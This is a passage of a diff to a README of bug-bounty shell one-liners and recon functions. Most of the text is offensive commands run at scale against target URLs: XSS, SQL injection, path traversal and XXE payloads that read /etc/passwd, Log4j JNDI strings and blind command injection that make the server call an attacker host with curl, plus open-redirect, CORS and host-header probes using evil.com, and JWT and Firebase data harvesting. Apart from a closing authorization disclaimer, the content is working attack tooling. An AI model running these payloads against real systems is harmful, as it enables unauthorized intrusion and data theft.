     subfinder -d $1 -silent | anew subs.txt
     assetfinder -subs-only $1 | anew subs.txt
     cat subs.txt | httpx -silent | anew alive.txt
+    echo "[+] Found $(wc -l < alive.txt) alive hosts"
 }
 
-# JavaScript recon
-reconjs() {
-    gau -subs $1 | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js.txt
-    cat js.txt | anti-burl | awk '{print $4}' | sort -u >> AliveJs.txt
-}
-
-# Certificate transparency search
-cert() {
-    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
-}
-
-# Anubis subdomain search
-anubis() {
-    curl -s "https://jldc.me/anubis/subdomains/$1" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
-}
-
-# Quick XSS scan
-quickxss() {
+# XSS scan
+xscan() {
     echo $1 | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 }
 
-# Nuclei quick scan
-nucleiscan() {
-    echo $1 | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high -o results.txt
+# SQLi scan
+sqscan() {
+    echo $1 | waybackurls | gf sqli | uro | qsreplace "'" | httpx -silent -ms "error|syntax|mysql"
 }
 
-# Full recon pipeline
+# JS recon
+jsrecon() {
+    echo $1 | waybackurls | grep -iE "\.js$" | httpx -silent | nuclei -t exposures/
+}
+
+# Nuclei quick
+nuke() {
+    echo $1 | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
+}
+
+# Full pipeline
 fullrecon() {
-    subfinder -d $1 -silent | anew subs.txt
-    cat subs.txt | httpx -silent | anew alive.txt
-    cat alive.txt | katana -d 3 -silent | anew crawl.txt
-    cat crawl.txt | gf xss | anew xss.txt
-    cat crawl.txt | gf sqli | anew sqli.txt
+    recon $1
+    cat alive.txt | katana -d 3 -jc -silent | anew urls.txt
+    cat urls.txt | gf xss | anew xss.txt
+    cat urls.txt | gf sqli | anew sqli.txt
+    nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
+}
+
+# Certificate search
+cert() {
+    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+}
+
+# Parameter extraction
+params() {
+    echo $1 | waybackurls | grep "=" | uro | unfurl keys | sort -u
 }
 ```
 
@@ -540,172 +480,188 @@ fullrecon() {
 
 ## New Oneliners 2024-2025
 
-<div align="center">
-<img src="https://media.giphy.com/media/3o7TKMt1VVNkHV2PaE/giphy.gif" width="400" alt="New Features">
-</div>
-
-### Nuclei DAST Scanning
+### Nuclei DAST XSS
 ```bash
-# Dynamic Application Security Testing with Nuclei
-cat urls.txt | httpx -silent | nuclei -dast -rl 10 -c 5 -o dast_results.txt
-```
-
-### Notify Integration
-```bash
-# Get notifications for findings
-nuclei -l targets.txt -t /nuclei-templates/ -severity critical | notify -silent
-```
-
-### Interactsh OOB Detection
-```bash
-# Out-of-band vulnerability detection
-cat urls.txt | qsreplace "https://YOUR_INTERACTSH.oast.fun" | httpx -silent
-```
-
-### CVE-specific Scanning
-```bash
-# Scan for specific CVEs
-nuclei -l targets.txt -t cves/2024/ -o cve_2024_results.txt
-```
-
-### API Endpoint Discovery
-```bash
-# Find API endpoints
-cat js_files.txt | xargs -I@ sh -c 'curl -s @ | grep -oE "/api/[a-zA-Z0-9/_-]+"' | sort -u | anew api_endpoints.txt
+echo "https://target.com" | nuclei -dast -t dast/vulnerabilities/xss/ -rl 5
 ```
 
 ### GraphQL Introspection
 ```bash
-# Test for GraphQL introspection
-cat urls.txt | httpx -silent -path /graphql -mc 200 | nuclei -t graphql/ -o graphql_vulns.txt
+cat urls.txt | httpx -silent -path /graphql -mc 200 | xargs -I@ curl -s @ -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | grep -v "error"
 ```
 
-### Swagger/OpenAPI Discovery
+### JWT Extraction
 ```bash
-# Find exposed API documentation
-cat urls.txt | httpx -silent -path /swagger.json,/openapi.json,/api-docs -mc 200 | anew swagger_exposed.txt
+cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
 ```
 
-### JWT Testing
+### Open Redirect Mass
 ```bash
-# Collect and analyze JWTs
-cat urls.txt | httpx -silent | katana -d 2 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
+cat urls.txt | gf redirect | qsreplace "https://evil.com" | httpx -silent -location | grep "evil.com"
 ```
 
-### Subdomain Takeover
+### CORS Misconfiguration
 ```bash
-# Check for subdomain takeover
-subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -o takeover_vulns.txt
+cat urls.txt | httpx -silent -H "Origin: https://evil.com" -match-string "evil.com" | anew cors_vuln.txt
 ```
 
-### Sensitive File Discovery
+### Host Header Injection
 ```bash
-# Find exposed sensitive files
-cat urls.txt | httpx -silent -path /.env,/.git/config,/config.php,/wp-config.php.bak -mc 200 | anew sensitive_files.txt
+cat urls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -match-string "evil.com"
+```
+
+### CRLF Injection
+```bash
+cat urls.txt | qsreplace "%0d%0aX-Injected: header" | httpx -silent -match-string "X-Injected"
+```
+
+### Prototype Pollution
+```bash
+cat js.txt | xargs -I@ curl -s @ | grep -E "(__proto__|constructor\.prototype)" | anew proto_pollution.txt
+```
+
+### Cache Poisoning Detection
+```bash
+cat urls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -H "X-Original-URL: /admin" -mc 200
+```
+
+### IDOR Pattern Detection
+```bash
+cat urls.txt | grep -oE "(id|user|account|uid|pid)=[0-9]+" | sort -u | anew idor_candidates.txt
+```
+
+### Race Condition URLs
+```bash
+cat urls.txt | grep -iE "(redeem|coupon|vote|like|follow|transfer|withdraw)" | anew race_condition.txt
+```
+
+### WebSocket Endpoints
+```bash
+cat urls.txt | grep -iE "(socket|ws://|wss://)" | anew websocket.txt
+```
+
+### Path Traversal
+```bash
+cat urls.txt | gf lfi | qsreplace "....//....//....//etc/passwd" | httpx -silent -match-string "root:x"
+```
+
+### XXE Detection
+```bash
+cat urls.txt | grep -iE "\.(xml|soap)" | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+```
+
+### Log4j Scan
+```bash
+cat urls.txt | qsreplace '${jndi:ldap://YOURSERVER/a}' | httpx -silent -H 'X-Api-Version: ${jndi:ldap://YOURSERVER/a}'
+```
+
+### Blind Command Injection
+```bash
+cat urls.txt | qsreplace "\`curl YOURSERVER\`" | httpx -silent
+cat urls.txt | qsreplace "| curl YOURSERVER" | httpx -silent
 ```
 
 ### Mass Screenshot
 ```bash
-# Screenshot all alive hosts
-cat alive.txt | gowitness file -f - -P screenshots/
+cat alive.txt | xargs -I@ gowitness single @ -o screenshots/
 ```
 
-### Xray Vulnerability Scanner
+### Technology Detection
 ```bash
-# Web vulnerability scanning with Xray
-xargs -a urls.txt -I@ sh -c './xray webscan --plugins cmd-injection,sqldet,xss --url "@" --html-output vuln.html'
+cat alive.txt | httpx -silent -tech-detect -status-code -title | anew tech_stack.txt
 ```
 
-### Log4j Scanning with BBRF
+### Favicon Hash (Shodan)
 ```bash
-# Log4j vulnerability assessment
-bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 log4j-scan.py -u "@"'
+curl -s https://target.com/favicon.ico | md5sum | awk '{print $1}'
 ```
 
-### Git Exposure Mass Check
+### S3 Bucket Finder
 ```bash
-# Mass hunt exposed .git directories
-hednsextractor -target "your target" -silent | httpx -path /.git/config -status-code -ms 200 -silent
+cat urls.txt | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com" | anew s3_buckets.txt
 ```
 
-### Hudson Rock Threat Intel
+### Firebase Database
 ```bash
-# Search for compromised credentials
-curl "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain=target.com"
+cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.firebaseio\.com" | xargs -I@ curl -s @/.json | grep -v "null"
+```
+
+### Exposed Admin Panels
+```bash
+cat alive.txt | httpx -silent -path /admin,/administrator,/admin.php,/wp-admin,/manager,/phpmyadmin -mc 200,301,302 | anew admin_panels.txt
+```
+
+### Debug Endpoints
+```bash
+cat alive.txt | httpx -silent -path /debug,/trace,/actuator,/metrics,/health,/info -mc 200 | anew debug_endpoints.txt
+```
+
+### Spring Boot Actuators
+```bash
+cat alive.txt | httpx -silent -path /actuator/env,/actuator/heapdump,/actuator/mappings -mc 200 | anew spring_actuators.txt
+```
+
+### WordPress Enumeration
+```bash
+cat alive.txt | httpx -silent -path /wp-json/wp/v2/users -mc 200 | anew wp_users.txt
+```
+
+### Laravel Debug Mode
+```bash
+cat alive.txt | httpx -silent -match-string "Whoops" -match-string "Laravel" | anew laravel_debug.txt
+```
+
+### Django Debug
+```bash
+cat alive.txt | httpx -silent -match-string "Django" -match-string "DEBUG" | anew django_debug.txt
 ```
 
 ---
 
 ## Search Engines for Hackers
 
-<div align="center">
-<img src="https://media.giphy.com/media/vISmwpBJUNYzukTnVx/giphy.gif" width="300" alt="Search">
-</div>
-
-| Engine | Description | Link |
-|:------:|:-----------:|:----:|
-| Shodan | IoT search engine | [shodan.io](https://shodan.io) |
-| Censys | Internet-wide scanning | [censys.io](https://censys.io) |
-| Fofa | Chinese security search | [en.fofa.info](https://en.fofa.info) |
-| ZoomEye | Cyberspace search | [zoomeye.org](https://zoomeye.org) |
-| Onyphe | Cyber defense search | [onyphe.io](https://onyphe.io) |
-| GreyNoise | Internet scanner detection | [viz.greynoise.io](https://viz.greynoise.io) |
-| CriminalIP | Threat intelligence | [criminalip.io](https://www.criminalip.io) |
-| Netlas | Attack surface discovery | [netlas.io](https://netlas.io) |
-| Hunter | Email discovery | [hunter.io](https://hunter.io) |
-| Intelx | Intelligence search | [intelx.io](https://intelx.io) |
-| Pulsedive | Threat intelligence | [pulsedive.com](https://pulsedive.com) |
-| DNSDumpster | DNS recon | [dnsdumpster.com](https://dnsdumpster.com) |
-| crt.sh | Certificate search | [crt.sh](https://crt.sh) |
-| PhoneBook | Domain/email search | [phonebook.cz](https://phonebook.cz) |
-| LeakRadar | Leak detection | [leakradar.io](https://leakradar.io) |
-| SubdomainRadar | Subdomain monitoring | [subdomainradar.io](https://subdomainradar.io) |
-| Hudson Rock | Cybercrime intelligence | [hudsonrock.com](https://www.hudsonrock.com/threat-intelligence-cybercrime-tools) |
+| Engine | Link | Description |
+|:------:|:----:|:-----------:|
+| Shodan | [shodan.io](https://shodan.io) | IoT & device search |
+| Censys | [censys.io](https://censys.io) | Internet scan data |
+| Fofa | [fofa.info](https://en.fofa.info) | Cyberspace search |
+| ZoomEye | [zoomeye.org](https://zoomeye.org) | Cyberspace mapping |
+| Hunter | [hunter.how](https://hunter.how) | Asset discovery |
+| Netlas | [netlas.io](https://netlas.io) | Attack surface |
+| GreyNoise | [greynoise.io](https://viz.greynoise.io) | Internet scanners |
+| Onyphe | [onyphe.io](https://onyphe.io) | Cyber defense |
+| CriminalIP | [criminalip.io](https://criminalip.io) | Threat intel |
+| FullHunt | [fullhunt.io](https://fullhunt.io) | Attack surface |
+| Quake | [quake.360.net](https://quake.360.net) | Cyberspace search |
+| Leakix | [leakix.net](https://leakix.net) | Leak detection |
+| URLScan | [urlscan.io](https://urlscan.io) | URL analysis |
+| DNSDumpster | [dnsdumpster.com](https://dnsdumpster.com) | DNS recon |
+| crt.sh | [crt.sh](https://crt.sh) | Certificate search |
+| SecurityTrails | [securitytrails.com](https://securitytrails.com) | DNS history |
 
 ---
 
 ## Special Thanks
 
-<div align="center">
-
-| Hunter | Twitter |
-|:------:|:-------:|
-| bt0s3c | [@bt0s3c](https://twitter.com/bt0s3c) |
-| Stok | [@stokfredrik](https://twitter.com/stokfredrik) |
-| Jhaddix | [@Jhaddix](https://twitter.com/Jhaddix) |
-| TomNomNom | [@TomNomNom](https://twitter.com/TomNomNom) |
-| Jeff Foley | [@jeff_foley](https://twitter.com/jeff_foley) |
-| NahamSec | [@NahamSec](https://twitter.com/NahamSec) |
-| zseano | [@zseano](https://twitter.com/zseano) |
-| pry0cc | [@pry0cc](https://twitter.com/pry0cc) |
-| pdiscoveryio | [@pdiscoveryio](https://twitter.com/pdiscoveryio) |
-
-</div>
+| Hunter | Hunter | Hunter |
+|:------:|:------:|:------:|
+| [@bt0s3c](https://twitter.com/bt0s3c) | [@MrCl0wnLab](https://twitter.com/MrCl0wnLab) | [@stokfredrik](https://twitter.com/stokfredrik) |
+| [@Jhaddix](https://twitter.com/Jhaddix) | [@TomNomNom](https://twitter.com/TomNomNom) | [@NahamSec](https://twitter.com/NahamSec) |
+| [@zseano](https://twitter.com/zseano) | [@pry0cc](https://twitter.com/pry0cc) | [@pdiscoveryio](https://twitter.com/pdiscoveryio) |
+| [@jeff_foley](https://twitter.com/jeff_foley) | [@haaborern](https://twitter.com/haaborern) | [@0xacb](https://twitter.com/0xacb) |
 
 ---
 
 <div align="center">
 
-## Download BugBuntu
-
-[![BugBuntu](https://img.shields.io/badge/Download-BugBuntu-orange?style=for-the-badge&logo=linux)](https://sourceforge.net/projects/bugbuntu/)
-
-<img src="https://media.giphy.com/media/du3J3cXyzhj75IOgvA/giphy.gif" width="300" alt="Linux">
-
----
-
-<a href="https://www.buymeacoffee.com/OFJAAAH"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" width="200"></a>
-
----
+<a href="https://www.buymeacoffee.com/OFJAAAH"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" width="180"></a>
 
 <p>
   <img src="https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?style=for-the-badge">
   <img src="https://img.shields.io/badge/Made%20with-Go-00ADD8.svg?style=for-the-badge&logo=go">
-  <img src="https://img.shields.io/badge/Open%20Source-Yes!-green?style=for-the-badge&logo=github">
+  <img src="https://img.shields.io/badge/Open%20Source-Yes-green?style=for-the-badge&logo=github">
 </p>
 
-**Disclaimer:** These tools and techniques are for authorized security testing only. Always obtain proper authorization before testing.
-
-<img src="https://media.giphy.com/media/3o7aCSPqXE5C6T8tBC/giphy.gif" width="300" alt="Security">
+**For authorized security testing only. Always obtain proper authorization.**
 
 </div>
